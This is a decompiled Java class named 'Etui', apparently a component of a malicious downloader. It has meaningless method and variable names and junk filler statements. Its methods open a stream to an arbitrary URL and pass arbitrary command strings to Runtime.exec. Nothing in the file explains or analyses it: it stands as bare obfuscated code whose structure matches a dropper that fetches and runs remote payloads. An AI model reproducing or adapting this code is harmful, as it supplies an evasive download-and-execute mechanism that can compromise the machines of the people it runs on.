import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Etui
{
    public static InputStream Mongo(final String iuytre) throws Exception {
        final URL ghitr5 = new URL(iuytre);
        int cnt = 24;
        --cnt;
        try {
            ghitr5.openConnection();
            final int aas = 1;
        }
        catch (Exception ex) {}
        return ghitr5.openStream();
    }
    
    public static Runtime Kopne() {
        return Runtime.getRuntime();
    }
    
    public static void Loema(final String wr4) throws Exception {
        final Process iytff3 = Kopne().exec(wr4);
        iytff3.waitFor();
    }
}
